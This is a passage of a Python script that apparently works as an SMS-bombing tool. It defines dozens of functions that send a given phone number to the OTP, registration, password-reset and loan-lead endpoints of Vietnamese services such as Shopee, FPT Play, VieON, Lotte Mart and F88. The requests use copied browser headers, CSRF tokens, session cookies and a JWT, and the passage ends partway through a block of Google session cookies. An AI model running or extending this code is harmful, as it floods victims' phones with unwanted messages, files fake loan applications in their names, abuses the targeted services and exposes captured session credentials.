        "query": "mutation SendOtp($input: SendOtpInput!) {  sendOtp(input: $input) {    otpTrackingId    __typename  }}",
    }
    response = requests.post(
        "https://api.onelife.vn/v1/gateway/",
        headers=headers,
        json=json_data,
        timeout=10,
    )
def call_mocha(phone):
    headers = {
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "Cache-Control": "no-cache",
        "Connection": "keep-alive",
        "Origin": "https://video.mocha.com.vn",
        "Pragma": "no-cache",
        "Referer": "https://video.mocha.com.vn/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
    }
    params = {
        "msisdn": phone,
        "languageCode": "vi",
    }
    response = requests.post(
        "https://apivideo.mocha.com.vn/onMediaBackendBiz/mochavideo/getOtp",
        params=params,
        headers=headers,
    )
def call_fptdk(phone):
    phone = f"+84{phone[1:]}" if phone.startswith("0") else phone
    headers = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8",
        "content-type": "application/json; charset=UTF-8",
        "dnt": "1",
        "origin": "https://fptplay.vn",
        "priority": "u=1, i",
        "referer": "https://fptplay.vn/",
        "sec-ch-ua": '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
        "x-did": "A0EB7FD5EA287DBF",
    }
    json_data = {
        "phone": phone,
        "country_code": "VN",
        "client_id": "vKyPNd1iWHodQVknxcvZoWz74295wnk8",
    }
    response = requests.post(
        "https://api.fptplay.net/api/v7.1_w/user/otp/register_otp?st=HvBYCEmniTEnRLxYzaiHyg&e=1722340953&device=Microsoft%20Edge(version%253A127.0.0.0)&drm=1",
        headers=headers,
        json=json_data,
    )
def call_fptmk(phone):
    phone = f"+84{phone[1:]}" if phone.startswith("0") else phone  # là quên pass ở fps á
    cookies = {
        "auth.strategy": "",
        "expire_welcome": "14400",
        "fpt_uuid": "%226b6e6e3c-9275-43ef-8c91-0d2aea2753e1%22",
        "ajs_group_id": "null",
        "G_ENABLED_IDPS": "google",
        "CDP_ANONYMOUS_ID": "1722362340735",
        "CDP_USER_ID": "1722362340735",
    }
    headers = {
        "accept": "*/*",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8",
        "dnt": "1",
        "referer": "https://fptplay.vn/",
        "sec-ch-ua": '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "script",
        "sec-fetch-mode": "no-cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
    }
    response = requests.get(
        "https://fptplay.vn/_nuxt/pages/block/_type/_id.26.0382316fc06b3038d49e.js",
        cookies=cookies,
        headers=headers,
    )
    headers = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8",
        "content-type": "application/json; charset=UTF-8",
        "dnt": "1",
        "origin": "https://fptplay.vn",
        "priority": "u=1, i",
        "referer": "https://fptplay.vn/",
        "sec-ch-ua": '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
        "x-did": "A0EB7FD5EA287DBF",
    }
    json_data = {
        "phone": phone,
        "country_code": "VN",
        "client_id": "vKyPNd1iWHodQVknxcvZoWz74295wnk8",
    }
    response = requests.post(
        "https://api.fptplay.net/api/v7.1_w/user/otp/reset_password_otp?st=0X65mEX0NBfn2pAmdMIC1g&e=1722365955&device=Microsoft%20Edge(version%253A127.0.0.0)&drm=1",
        headers=headers,
        json=json_data,
    )
def call_VIEON(phone):
    headers = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8",
        "authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MjI1MTA3NDksImp0aSI6IjQ3OGJkODI1MmY2ODdkOTExNzdlNmJhM2MzNTE5ZDNkIiwiYXVkIjoiIiwiaWF0IjoxNzIyMzM3OTQ5LCJpc3MiOiJWaWVPbiIsIm5iZiI6MTcyMjMzNzk0OCwic3ViIjoiYW5vbnltb3VzX2Y4MTJhNTVkMWQ1ZWUyYjg3YTkyNzgzM2RmMjYwOGJjLTRmNzQyY2QxOTE4NjcwYzIzODNjZmQ3ZGRiNjJmNTQ2LTE3MjIzMzc5NDkiLCJzY29wZSI6ImNtOnJlYWQgY2FzOnJlYWQgY2FzOndyaXRlIGJpbGxpbmc6cmVhZCIsImRpIjoiZjgxMmE1NWQxZDVlZTJiODdhOTI3ODMzZGYyNjA4YmMtNGY3NDJjZDE5MTg2NzBjMjM4M2NmZDdkZGI2MmY1NDYtMTcyMjMzNzk0OSIsInVhIjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyNy4wLjAuMCBTYWZhcmkvNTM3LjM2IEVkZy8xMjcuMC4wLjAiLCJkdCI6IndlYiIsIm10aCI6ImFub255bW91c19sb2dpbiIsIm1kIjoiV2luZG93cyAxMCIsImlzcHJlIjowLCJ2ZXJzaW9uIjoiIn0.RwOGV_SA9U6aMo84a1bxwRjLbxdDLB-Szg7w_riYKAA",
        "content-type": "application/json",
        "dnt": "1",
        "origin": "https://vieon.vn",
        "priority": "u=1, i",
        "referer": "https://vieon.vn/auth/?destination=/&page=/",
        "sec-ch-ua": '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
    }
    params = {
        "platform": "web",
        "ui": "012021",
    }
    json_data = {
        "username": phone,
        "country_code": "VN",
        "model": "Windows 10",
        "device_id": "f812a55d1d5ee2b87a927833df2608bc",
        "device_name": "Edge/127",
        "device_type": "desktop",
        "platform": "web",
        "ui": "012021",
    }
    response = requests.post(
        "https://api.vieon.vn/backend/user/v2/register",
        params=params,
        headers=headers,
        json=json_data,
        timeout=10,
    )
def call_ghn(phone):
    headers = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8",
        "content-type": "application/json",
        "dnt": "1",
        "origin": "https://sso.ghn.vn",
        "priority": "u=1, i",
        "referer": "https://sso.ghn.vn/",
        "sec-ch-ua": '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
    }
    json_data = {
        "phone": phone,
        "type": "register",
    }
    response = requests.post(
        "https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp",
        headers=headers,
        json=json_data,
        timeout=10,
    )
def call_lottemart(phone):
    phone = f"+84{phone[1:]}" if phone.startswith("0") else phone
    headers = {
        "accept": "application/json",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8",
        "content-type": "application/json",
        "dnt": "1",
        "origin": "https://www.lottemart.vn",
        "priority": "u=1, i",
        "referer": "https://www.lottemart.vn/signup?callbackUrl=https://www.lottemart.vn/",
        "sec-ch-ua": '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
    }
    json_data = {
        "username": phone,
        "case": "register",
    }
    response = requests.post(
        "https://www.lottemart.vn/v1/p/mart/bos/vi_bdg/V1/mart-sms/sendotp",
        headers=headers,
        json=json_data,
    )
def call_DONGCRE(phone):
    headers = {
        "accept": "application/json",
        "accept-language": "vi-VN",
        "content-type": "application/json; charset=utf-8",
        "dnt": "1",
        "origin": "https://vayvnd.vn",
        "priority": "u=1, i",
        "referer": "https://vayvnd.vn/",
        "sec-ch-ua": '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "site-id": "3",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
    }
    json_data = {
        "login": phone,
        "trackingId": "Kqoeash6OaH5e7nZHEBdTjrpAM4IiV4V9F8DldL6sByr7wKEIyAkjNoJ2d5sJ6i2",
    }
    response = requests.post(
        "https://api.vayvnd.vn/v2/users/password-reset",
        headers=headers,
        json=json_data,
        timeout=10,
    )
def call_shopee(phone):
    phone = f"+84{phone[1:]}" if phone.startswith("0") else phone
    cookies = {
        "_QPWSDCXHZQA": "e7d49dd0-6ed7-4de5-a3d4-a5dddf426740",
        "REC7iLP4Q": "312bf815-7526-4121-82bf-61c29691b57f",
        "SPC_F": "eApCJPujNJOFZiacoq7eGjWnTU7cd3Wq",
        "REC_T_ID": "23f51dde-355f-11ef-bcef-3eebbabc6162",
        "SPC_R_T_ID": "ZcJ87jKdJGSlC3VX10/9xAYJwlG33U+qEHa6UUKuOw392Nodkqgt3JJ2/1y1jP7hJifnOS9ukZei1G0NGxE6PMM6rDyOqN8Osx4wFEfwbD4iBlR6ndfolrrhxf43tm+j8MIJ+5MeXcP3YRaEs1SGR3xqzySLWxUSD9vA5fzclL0=",
        "SPC_R_T_IV": "OGxlR1dmMTU0SlI0cWJPZA==",
        "SPC_T_ID": "ZcJ87jKdJGSlC3VX10/9xAYJwlG33U+qEHa6UUKuOw392Nodkqgt3JJ2/1y1jP7hJifnOS9ukZei1G0NGxE6PMM6rDyOqN8Osx4wFEfwbD4iBlR6ndfolrrhxf43tm+j8MIJ+5MeXcP3YRaEs1SGR3xqzySLWxUSD9vA5fzclL0=",
        "SPC_T_IV": "OGxlR1dmMTU0SlI0cWJPZA==",
        "__LOCALE__null": "VN",
        "csrftoken": "PTrvD9jNtOCSEWknpqxdSLzwktIJfOjs",
        "SPC_SI": "p2WfZgAAAABlcGJjWmV3UP9seAAAAAAAUmIxZ2lPb2M=",
        "SPC_SEC_SI": "v1-cUswSmEyOXdTNENBTmNHNTgHK99VbobW+cMofVQ6acBDr9gQg364or6bMtqnNYyW0QSnQAV0mT8IzCejzwKp4mek1/iHPT415m5chSdl+S8=",
        "_sapid": "1e7884581da8fa3ebb28ef15c21460d85393c5239e181c912dfddf45",
    }
    headers = {
        "accept": "application/json",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8",
        "af-ac-enc-dat": "438deef2a644b9a6",
        "af-ac-enc-sz-token": "",
        "content-type": "application/json",
        "dnt": "1",
        "origin": "https://shopee.vn",
        "priority": "u=1, i",
        "referer": "https://shopee.vn/buyer/signup?next=https%3A%2F%2Fshopee.vn%2F",
        "sec-ch-ua": '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
        "x-api-source": "pc",
        "x-csrftoken": "PTrvD9jNtOCSEWknpqxdSLzwktIJfOjs",
        "x-requested-with": "XMLHttpRequest",
        "x-sap-ri": "22d9a8667b497dfe94c089340401498ec675997cbc5522816f11",
        "x-sap-sec": "u476ZVItP6d5d4mjdbAXdgcjKHFhdxPj2bFOdZcj/6FRdZtjMbFndaJjNbFXdbcjQ6FYdbZjdbTKdgmj1HTVdihjXbTXdjLjDbTzdjUjGbAsdlmjYbA/dm3jZbA2dmmjabAVdyJjjbAXdzcjlbAzdzFjhHDpdCGjobD/dG3jEbDQdGZjHVDNdYLjObDDdYZjkbDbdwejIVDzdwUjLbAXdbFjdbA4pbTIj2Vwd6Fj0btjdycgdbAexbTfQbtjdbFjdYuMg3R2dbAfu+JgdbFjdbFicmAmm6FOr4gV0FVMdbTFRTFgdbFjGVM7BbUjdmmjdbFjdbJOjbFjdbFjdgp5d6FjdwnL2dnfehPjdbsORbUjdbFjdffRd6FjdbFjgFDdVQSzd6Fjnb8jdwFgdbFud6FjsbUjdzNzZqlVd6Fjvb8jdlFidbA2d6FjP1U0zzmgdbFuUwR1dbFjUEMSOBFjdZ04ObUjdaSwN7JjdbFlmb8jdfFidbFjdbTccbUjdbFjdbiAdVFjdbFj06mjdbTd7kdDOV8jdzb1b1qqfGpdmLdIqAAKbRL2SgDbBNg6B3nVd7kGR7z4+wJ7/SSwEScz+iqxyMwILgB12leqy9yJfu70zqiQnIK2ygQtEcp6oSZ42fKlHdCQVg5R19dNKIZ6UIIK0AzVwJsXTLbqq3J/i8rgxRmTn+rOOQG40bhL70hPMPRhbJAC+M0yWItYBwrvGjS4PdAPtn5ioTpEKu4zqw6ogq5Dc+AJpdsvRWZB71oRp6qeur1aMxYkXHiYukh88xRrpj+t5K+OndYJeXfMScjRaYcUbZItYcOAvG3gacwmnxPK9FVwLgq+pD0M3UxDWWEF3VrG1lEjFX8fe8CLeRmb9f7OmN78WcxxPrkRQp6oDTgiEgC8cLXyfNziJj26Ehw72GpZfVQTL83eiqN9PyHYVVdgBXRDzUlt2ZrTkam6CP9G0lNtX3EIzhx0zPNMjqianyiQlzOVpAePiwIH/6FjdbmjdbF4RkZoRbFjdGMmX/PwdbFjShlMH/8O2LUjdbFjQbFjdCetJ6y/XoLodbFjdbFjdbFldbFj4qNrSSX+3bFbdbFj6HTr22kcoV8pR8LkdbFjdbUjdbDaEVFjd6FjdwDhdbFzdbFjs0N2S6FjdbFzdbFjMRwF6HmjdbAwW0FyRbFjdfdtkbgwdbFj92xLl1DrRHgwdbFj2EfR0xPP0EJjdbFjQbFjdaZ586CeX0LoRbFjdzqIPjMgdbFjzOGjdbUjdbAjuHFjRbFjdzqIPjMwdbFj2vF4HLfdStgjdbFjQbFjdz9mxU80RDtYRbFjdfJ2+QgfdbFj/t8XdbJjdbFI2hl+KvZ426FjdbD=",
        "x-shopee-language": "vi",
        "x-sz-sdk-version": "1.10.12",
    }
    json_data = {
        "operation": 8,
        "encrypted_phone": "",
        "phone": phone,
        "supported_channels": [
            1,
            2,
            3,
            6,
            0,
            5,
        ],
        "support_session": True,
    }
    response = requests.post(
        "https://shopee.vn/api/v4/otp/get_settings_v2",
        cookies=cookies,
        headers=headers,
        json=json_data,
        timeout=10,
    )
def call_TGDD(phone):
    phone = f"+84{phone[1:]}" if phone.startswith("0") else phone
    
    cookies = {
        "TBMCookie_3209819802479625248": "894382001722342691cqyfhOAE+C8MQhU15demYwBqEBg=",
        "___utmvm": "###########",
        "___utmvc": "navigator%3Dtrue,navigator.vendor%3DGoogle%20Inc.,navigator.appName%3DNetscape,navigator.plugins.length%3D%3D0%3Dfalse,navigator.platform%3DWin32,navigator.webdriver%3Dfalse,plugin_ext%3Dno%20extention,ActiveXObject%3Dfalse,webkitURL%3Dtrue,_phantom%3Dfalse,callPhantom%3Dfalse,chrome%3Dtrue,yandex%3Dfalse,opera%3Dfalse,opr%3Dfalse,safari%3Dfalse,awesomium%3Dfalse,puffinDevice%3Dfalse,__nightmare%3Dfalse,domAutomation%3Dfalse,domAutomationController%3Dfalse,_Selenium_IDE_Recorder%3Dfalse,document.__webdriver_script_fn%3Dfalse,document.%24cdc_asdjflasutopfhvcZLmcfl_%3Dfalse,process.version%3Dfalse,navigator.cpuClass%3Dfalse,navigator.oscpu%3Dfalse,navigator.connection%3Dtrue,navigator.language%3D%3D'C'%3Dfalse,window.outerWidth%3D%3D0%3Dfalse,window.outerHeight%3D%3D0%3Dfalse,window.WebGLRenderingContext%3Dtrue,document.documentMode%3Dundefined,eval.toString().length%3D33,digest=",
        "SvID": "beline173|ZqjdK|ZqjdJ",
        "DMX_Personal": "%7B%22UID%22%3A%223c58da506194945adf5d8d9e18d28ca1ca483d53%22%2C%22ProvinceId%22%3A3%2C%22Address%22%3Anull%2C%22Culture%22%3A%22vi-3%22%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22DistrictId%22%3A0%2C%22WardId%22%3A0%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%2C%22CRMCustomerId%22%3Anull%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerEmail%22%3Anull%2C%22CustomerIdentity%22%3Anull%2C%22CustomerBirthday%22%3Anull%2C%22CustomerAddress%22%3Anull%2C%22IsDefault%22%3Afalse%2C%22IsFirst%22%3Afalse%7D",
        "mwgngxpv": "3",
        ".AspNetCore.Antiforgery.Pr58635MgNE": "CfDJ8AFHr2lS7PNCsmzvEMPceBNuKhu64cfeRcyGk7T6c5GgDttZC363Cp1Zc4WiXaPsxJi4BeonTwMxJ7cnVwFT1eVUPS23wEhNg_-vSnOQ12JjoIl3tF3e8WtTr1u5FYJqE34hUQbyJFGPNNIOW_3wmJY",
    }
    headers = {
        "Accept": "*/*",
        "Accept-Language": "vi,en-US;q=0.9,en;q=0.8",
        "Connection": "keep-alive",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "DNT": "1",
        "Origin": "https://www.thegioididong.com",
        "Referer": "https://www.thegioididong.com/lich-su-mua-hang/dang-nhap",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
        "X-Requested-With": "XMLHttpRequest",
        "sec-ch-ua": '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
    }
    data = {
        "phoneNumber": phone,
        "isReSend": "false",
        "sendOTPType": "1",
        "__RequestVerificationToken": "CfDJ8AFHr2lS7PNCsmzvEMPceBO-ZX6s3L-YhIxAw0xqFv-R-dLlDbUCVqqC8BRUAutzAlPV47xgFShcM8H3HG1dOE1VFoU_oKzyadMJK7YizsANGTcMx00GIlOi4oyc5lC5iuXHrbeWBgHEmbsjhkeGuMs",
    }
    response = requests.post(
        "https://www.thegioididong.com/lich-su-mua-hang/LoginV2/GetVerifyCode",
        cookies=cookies,
        headers=headers,
        data=data,
    )
def call_fptshop(phone):
    phone = f"+84{phone[1:]}" if phone.startswith("0") else phone
    headers = {
        "accept": "*/*",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8",
        "apptenantid": "E6770008-4AEA-4EE6-AEDE-691FD22F5C14",
        "content-type": "application/json",
        "dnt": "1",
        "order-channel": "1",
        "origin": "https://fptshop.com.vn",
        "priority": "u=1, i",
        "referer": "https://fptshop.com.vn/",
        "sec-ch-ua": '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
    }
    json_data = {
        "fromSys": "WEBKHICT",
        "otpType": "0",
        "phoneNumber": phone,
    }
    response = requests.post(
        "https://papi.fptshop.com.vn/gw/is/user/new-send-verification",
        headers=headers,
        json=json_data,
        timeout=10,
    )
def call_WinMart(phone):
    headers = {
        "accept": "application/json",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8",
        "authorization": "Bearer undefined",
        "content-type": "application/json",
        "dnt": "1",
        "origin": "https://winmart.vn",
        "priority": "u=1, i",
        "referer": "https://winmart.vn/",
        "sec-ch-ua": '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
        "x-api-merchant": "WCM",
    }
    json_data = {
        "firstName": "Nguyễn Quang Ngọc",
        "phoneNumber": phone,
        "masanReferralCode": "",
        "dobDate": "2024-07-26",
        "gender": "Male",
    }
    response = requests.post(
        "https://api-crownx.winmart.vn/iam/api/v1/user/register",
        headers=headers,
        json=json_data,
        timeout=10,
    )
def call_vietloan(phone):
    cookies = {
        "__cfruid": "05dded470380675f852d37a751c7becbfec7f394-1722345991",
        "XSRF-TOKEN": "eyJpdiI6IittWVVUb1dUNFNMRUtKRiswaDhITHc9PSIsInZhbHVlIjoiVTNWSU9vdTdJYndFZlM1UFo4enlQMzRCeENSWXRwNjgwT1NtWEdOSVNuNmNBZkxTMnUyRUJ1dytNSlVJVjZKS0o1V1FRQS81L2xFN0NOdGkvQitnL2xScjlGd3FBSXNBaUQ5ekdOTHBMMjY2b0tsZlI0OFZRdW9BWjgvd3V6blgiLCJtYWMiOiJhNzQwNzY5ZmY1YzZmNzMzYWFmOWM5YjVjYjFkYjA2MzJkYWIyNjVlOGViY2U2NGQxOGFiZWI4MGQ3NGI1Nzk1IiwidGFnIjoiIn0%3D",
        "sessionid": "eyJpdiI6IjBmbkMwd0JZenpMMnN2eDJiMmZjdGc9PSIsInZhbHVlIjoiTjl6U0NmZ213cjV1MG9VZEZhVHFkK2JDLzNiL1paaTR6dXhCM085a0gzTWhuSjhhUnhMNTNhb0wrNGtqM2U1OHF6UWNOMS9RcUxPWVdHR1NyUmt6OWtzcEVVd25DM3RiUUhOZWlXYTBiOG4rY0tKTUMrZGhHMGJPTlVqaDM1ME0iLCJtYWMiOiI2ZDcwNTQ5Mjg5M2Q0ZjYyOGQxOGJlZmQxZjEwYjY5NmY5ZTU5MTM1YjUzNGYzMDk3YmUyMTQ4YTcyNGE2OWFmIiwidGFnIjoiIn0%3D",
        "utm_uid": "eyJpdiI6IkZSSFZ1Y25QeDUyV3VSMTVoWDZtTkE9PSIsInZhbHVlIjoiRHNxL0MrVC80aDI5dUxtcVU0UmR3ZE4rajFRd0I4STVXVVlBQURubWN4Qlk1Tm1idGJJWGNDTCtYTGVjdlYzVGxNLzBVbW9GYi9mZDQ4S09ZTkk0Q0dUNWE5cU90cm5jWWNGV3JYOEpuSFRoeC93cDhkUnVSaEswRUpyNWVheDAiLCJtYWMiOiIyODMwZDlkOGE1ZTI1ZTNiNjJmYjlmZDY2MTBmYmZiYzA4ZWMwYTYxN2JhMGY0NTk2ZWU4ZWE4Y2JiYWFlNDRlIiwidGFnIjoiIn0%3D",
        "ec_cache_utm": "65518847-15fb-c698-6901-aae49c28ed93",
        "ec_cache_client": "false",
        "ec_cache_client_utm": "null",
        "ec_png_utm": "65518847-15fb-c698-6901-aae49c28ed93",
        "ec_png_client": "false",
        "ec_png_client_utm": "null",
        "ec_etag_client": "false",
        "ec_etag_utm": "65518847-15fb-c698-6901-aae49c28ed93",
        "ec_etag_client_utm": "null",
        "uid": "65518847-15fb-c698-6901-aae49c28ed93",
        "client": "false",
        "client_utm": "null",
    }
    headers = {
        "accept": "*/*",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "dnt": "1",
        "origin": "https://vietloan.vn",
        "priority": "u=1, i",
        "referer": "https://vietloan.vn/register",
        "sec-ch-ua": '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
        "x-requested-with": "XMLHttpRequest",
    }
    data = {
        "phone": phone,
        "_token": "XPEgEGJyFjeAr4r2LbqtwHcTPzu8EDNPB5jykdyi",
    }
    response = requests.post(
        "https://vietloan.vn/register/phone-resend",
        cookies=cookies,
        headers=headers,
        data=data,
    )
def call_lozi(phone):
    headers = {
        "accept": "*/*",
        "accept-language": "vi",
        "content-type": "application/json",
        "dnt": "1",
        "origin": "https://lozi.vn",
        "priority": "u=1, i",
        "referer": "https://lozi.vn/",
        "sec-ch-ua": '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
        "x-access-token": "unknown",
        "x-city-id": "50",
        "x-lozi-client": "1",
    }
    json_data = {
        "countryCode": "84",
        "phoneNumber": phone,
    }
    response = requests.post(
        "https://mocha.lozi.vn/v1/invites/use-app",
        headers=headers,
        json=json_data,
        timeout=10,
    )
def call_F88(phone):
    headers = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8",
        "content-type": "application/json",
        "dnt": "1",
        "origin": "https://f88.vn",
        "priority": "u=1, i",
        "referer": "https://f88.vn/",
        "sec-ch-ua": '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
    }
    json_data = {
        "FullName": generate_random_name(),
        "Phone": phone,
        "DistrictCode": "024",
        "ProvinceCode": "02",
        "AssetType": "Car",
        "IsChoose": "1",
        "ShopCode": "",
        "Url": "https://f88.vn/lp/vay-theo-luong-thu-nhap-cong-nhan",
        "FormType": 1,
    }
    response = requests.post(
        "https://api.f88.vn/growth/webf88vn/api/v1/Pawn",
        headers=headers,
        json=json_data,
        timeout=10,
    )
def call_spacet(phone):
    cookies = {
        "__Secure-3PAPISID": "hzjo-onowVujm8hO/APR9oFpV5LpkJ1uUf",
        "__Secure-3PSID": "g.a000mAj8VTgKdTM5295zCD8FHTg2FaugGzXq7QDPI6k2r47swLbbR0CWinLh60SIYySIqJMj2gACgYKAQsSAQASFQHGX2MiggjnC5RZxxFQPBEqGX6bjBoVAUF8yKqII052GBUsfWgiEjonB8li0076",
